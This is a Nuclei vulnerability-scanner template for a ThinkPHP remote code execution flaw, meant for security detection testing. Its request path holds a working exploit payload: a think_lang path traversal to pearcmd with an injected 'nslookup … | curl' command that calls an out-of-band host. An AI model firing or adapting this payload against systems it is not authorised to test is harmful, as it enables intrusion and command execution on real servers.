id: thinkphp-rce
info:
  author: shelled
  description: ThinkPHP <6.0.14 RCE
  name: ThinkPHP RCE
  reference:
  - https://twitter.com/cyberkendra/status/1601178498806472705
  - https://twitter.com/TodayCyberNews/status/1601209967872442370
  severity: high
  tags: cmdi,oast,dast,blind,rce
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  method: GET
  path:
  - '{{BaseURL}}/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=nslookup
    {{interactsh-url}}|curl {{interactsh-url}}'
  stop-at-first-match: true
